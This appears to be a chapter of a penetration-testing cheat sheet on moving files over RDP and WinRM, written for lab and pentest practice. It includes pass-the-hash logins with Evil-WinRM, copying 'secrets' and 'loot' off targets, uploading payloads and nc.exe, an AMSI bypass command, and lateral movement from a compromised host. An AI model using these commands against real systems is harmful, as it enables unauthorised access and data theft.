# 08 - RDP / WinRM

> [← README](../../README.md) · [Next section →](09-lolbins.md)

Two-way interactive channels. **RDP** mounts your local folder right into the target's session. **WinRM** (PowerShell Remoting) copies files over an already established session - a lifesaver when HTTP/HTTPS/SMB are unavailable.

> **Moved to other files:** SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), Netcat - [07-netcat.md](07-netcat.md).

---

## Navigation

|  |  |
|---|---|
| [1. RDP - drive mounting](#1-rdp---drive-mounting) | [2. WinRM (PowerShell Remoting)](#2-winrm-powershell-remoting) |
| [3. Evil-WinRM](#3-evil-winrm) | [4. Local lab (VMware)](#4-local-lab-vmware) |
| [5. Diagnostics](#5-diagnostics) |  |

---

## 1. RDP - drive mounting

Connect to the target and mount your local folder inside the session. Within RDP it appears as `\\tsclient\<name>`.

### xfreerdp

**Mount `/tmp/share` as the drive `share`:**
```bash
xfreerdp /v:$RHOST /d:HTB /u:administrator /p:'Password0@' /drive:share,/tmp/share
```

**Ignore the certificate and enable the clipboard:**
```bash
xfreerdp /v:$RHOST /u:administrator /p:'Password0@' /drive:share,/tmp/share /cert:ignore /clipboard
```

**Non-standard port:**
```bash
xfreerdp /v:$RHOST:3389 /u:administrator /p:'Password0@' /drive:share,/tmp/share
```

**Dynamic window resolution:**
```bash
xfreerdp /v:$RHOST /u:administrator /p:'Password0@' /drive:share,/tmp/share /dynamic-resolution
```

### rdesktop

**Mount `/tmp/share` as the drive `share`:**
```bash
rdesktop $RHOST -d HTB -u administrator -p 'Password0@' -r disk:share='/tmp/share'
```

**With the clipboard:**
```bash
rdesktop $RHOST -u administrator -p 'Password0@' -r disk:share='/tmp/share' -r clipboard:CLIPBOARD
```

### mstsc (Windows client)

**Launch the RDP client:**
```cmd
mstsc /v:%RHOST%
```

> `mstsc.exe` has **no** `/drive` switch - drive redirection is enabled in the GUI: **Local Resources → More… → Drives**. After connecting, your drive appears as `\\tsclient\C`.

### Inside the RDP session

**Explorer - path to the mounted drive:**
```text
\\tsclient\share
```

**Download a file to yourself (from the target to your drive):**
```text
copy C:\Users\Public\secrets.zip \\tsclient\share\
```

**Upload a file to the target (from your drive):**
```text
copy \\tsclient\share\payload.exe C:\Users\Public\
```

### Useful flags

| xfreerdp flag | What it does |
|---------------|-----------|
| `/v:host[:port]` | target address (and port) |
| `/u:user` `/d:domain` `/p:pass` | credentials |
| `/drive:<name>,<path>` | mount a local folder |
| `/cert:ignore` | don't verify the certificate |
| `/clipboard` | shared clipboard |
| `/dynamic-resolution` | adjust the resolution |
| `+clipboard` | enable clipboard (older syntax) |

---

## 2. WinRM (PowerShell Remoting)

**PowerShell Remoting (WinRM)** - remote management of a Windows machine through PowerShell. Ports: **5985** (HTTP), **5986** (HTTPS).

> **Important:** if the port is closed, nothing will work. You need WinRM enabled (`Enable-PSRemoting`), rights, and working credentials.

### Preparing the target (if WinRM isn't enabled yet)

**Enable WinRM (admin rights required, on the target):**
```powershell
Enable-PSRemoting -Force
```

**Allow Basic authentication (for non-domain scenarios):**
```powershell
winrm set winrm/config/service/auth '@{Basic="true"}'
```

**Allow unencrypted traffic (labs only, HTTP):**
```powershell
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
```

**For a workgroup - add the target to TrustedHosts (on the source machine):**
```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<target>" -Force
```

### Checking availability

**Port is open (5985 HTTP / 5986 HTTPS):**
```powershell
Test-NetConnection -ComputerName <target> -Port 5985
```

**WinRM is enabled locally:**
```powershell
Test-WSMan -ComputerName localhost
```

**Permission to connect to the remote machine:**
```powershell
Get-PSSessionConfiguration -ComputerName <target>
```

### Creating a session

**With the current credentials:**
```powershell
$Session = New-PSSession -ComputerName <target>
```

**With explicit credentials:**
```powershell
$Cred = Get-Credential
$Session = New-PSSession -ComputerName <target> -Credential $Cred
```

**Over HTTPS and a non-standard port:**
```powershell
$Session = New-PSSession -ComputerName <target> -Port 5986 -UseSSL
```

**For a workgroup (Basic/Negotiate):**
```powershell
$Session = New-PSSession -ComputerName <target> -Credential $Cred -Authentication Negotiate
```

**Interactive session (as if you were sitting at the remote machine):**
```powershell
Enter-PSSession -ComputerName <target>
```

**Exit the interactive session:**
```powershell
Exit-PSSession
```

### File transfer

**Send a file to the remote machine:**
```powershell
Copy-Item -Path C:\Users\Public\payload.exe -ToSession $Session -Destination C:\Users\Public\payload.exe
```

**Send several files:**
```powershell
Copy-Item -Path C:\Users\Public\*.ps1 -ToSession $Session -Destination C:\Users\Public\
```

**Send a whole folder:**
```powershell
Copy-Item -Path C:\Users\Public\folder\ -ToSession $Session -Destination C:\Users\Public\ -Recurse
```

**Pull a file from the remote machine:**
```powershell
Copy-Item -Path "C:\Users\Public\secrets.txt" -Destination C:\Users\Public\ -FromSession $Session
```

**Pull several files:**
```powershell
Copy-Item -Path "C:\Users\Public\*.txt" -Destination C:\Users\Public\ -FromSession $Session
```

**Pull a folder recursively:**
```powershell
Copy-Item -Path "C:\Users\Public\loot\" -Destination C:\Users\Public\ -FromSession $Session -Recurse
```

### Running commands through the session

**A single command:**
```powershell
Invoke-Command -Session $Session -ScriptBlock { Get-Process }
```

**A script with parameters:**
```powershell
Invoke-Command -Session $Session -FilePath C:\Users\Public\script.ps1 -ArgumentList "param1", "param2"
```

**Saving the result:**
```powershell
$Result = Invoke-Command -Session $Session -ScriptBlock { Get-Service | Where-Object Status -eq 'Running' }
```

### Managing sessions

**Show all active sessions:**
```powershell
Get-PSSession
```

**Show sessions on the remote machine:**
```powershell
Get-PSSession -ComputerName <target>
```

**Close a specific session:**
```powershell
Remove-PSSession -Session $Session
```

**Close all sessions:**
```powershell
Get-PSSession | Remove-PSSession
```

---

## 3. Evil-WinRM

https://github.com/Hackplayers/evil-winrm - comes with Kali by default. A WinRM wrapper with convenient `upload`/`download`.

### Installation

**Via gem:**
```bash
gem install evil-winrm
```

**Or from source:**
```bash
git clone https://github.com/Hackplayers/evil-winrm && cd evil-winrm && bundle install
```

### Connecting

**Username/password:**
```bash
evil-winrm -i $RHOST -u admin -p "1337"
```

**With an NTLM hash (pass-the-hash):**
```bash
evil-winrm -i $RHOST -u admin -H <NThash>
```

**Over HTTPS (5986):**
```bash
evil-winrm -i $RHOST -u admin -p "1337" -S
```

**Non-standard port:**
```bash
evil-winrm -i $RHOST -u admin -p "1337" -P 5986 -S
```

### File transfer

**Upload to the target:**
```text
upload /tmp/share/nc.exe
```

**Download FROM the target to the attacker:**
```text
download secrets.zip
```

**Change into a directory and grab from there:**
```text
cd Downloads
download secrets.zip
```

### Useful commands inside

**Command list:**
```text
menu
```

**Load a .NET assembly into memory (Bypass-4MSI etc.):**
```text
Bypass-4MSI
```

**Run a PowerShell command:**
```text
Invoke-Binary /tmp/share/tool.exe
```

---

## 4. Local lab (VMware)

Run the commands on the test Windows machine itself (RHOST).

**Make the network private:**
```powershell
Set-NetConnectionProfile -InterfaceAlias "Ethernet0" -NetworkCategory Private
```

**Check the profile:**
```powershell
Get-NetConnectionProfile
```

**Enable WinRM:**
```powershell
Enable-PSRemoting -Force
```

**Verify everything is fine:**
```powershell
Test-NetConnection -Port 5985
```

**Set a password for the user (if not set):**
```cmd
net user admin 1337
```

**After testing - disable WinRM and set the network back to Public:**
```powershell
Disable-PSRemoting -Force
Set-NetConnectionProfile -InterfaceAlias "Ethernet0" -NetworkCategory Public
```

---

## 5. Diagnostics

**RDP port is open:**
```bash
nc -zv $RHOST 3389
```

**WinRM HTTP/HTTPS is open:**
```bash
nc -zv $RHOST 5985
nc -zv $RHOST 5986
```

**Check WinRM from PowerShell:**
```powershell
Test-WSMan -ComputerName <target>
```

**Active sessions:**
```powershell
Get-PSSession
```

> **Common pitfalls:**
>
> - **Workgroup without TrustedHosts** → WinRM refuses. On the source: `Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<target>" -Force`.
> - **Port 5985/5986 is closed** → neither `New-PSSession` nor Evil-WinRM will connect (check with `Test-NetConnection`/`nc`).
> - **Basic authentication** over HTTP requires `auth @{Basic="true"}` on the target and, for labs, `AllowUnencrypted="true"`.
> - **RDP: `mstsc.exe` has no `/drive`** - drive redirection only through the GUI (Local Resources → Drives).
> - **The redirected drive path is `\\tsclient\<name>`**; you set the name yourself in `/drive:<name>,<path>`.
> - **RDP non-standard port** - `/v:host:port` for xfreerdp, `/v:host:port` for mstsc.
> - **`Enable-PSRemoting` requires admin** and a network profile of Private/Domain (it refuses on Public).

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [09 - LOLBins](09-lolbins.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

See the [README](../../README.md#notation-and-variables) for details.

> **About `<target>`.** The WinRM/Evil-WinRM sections often deal with **lateral movement**: we already have a shell on one Windows machine and are moving to a second one. There, `<target>` is the second, remote machine, while the commands run on the first (compromised) one.

---

[← Back to the reference](../../README.md)
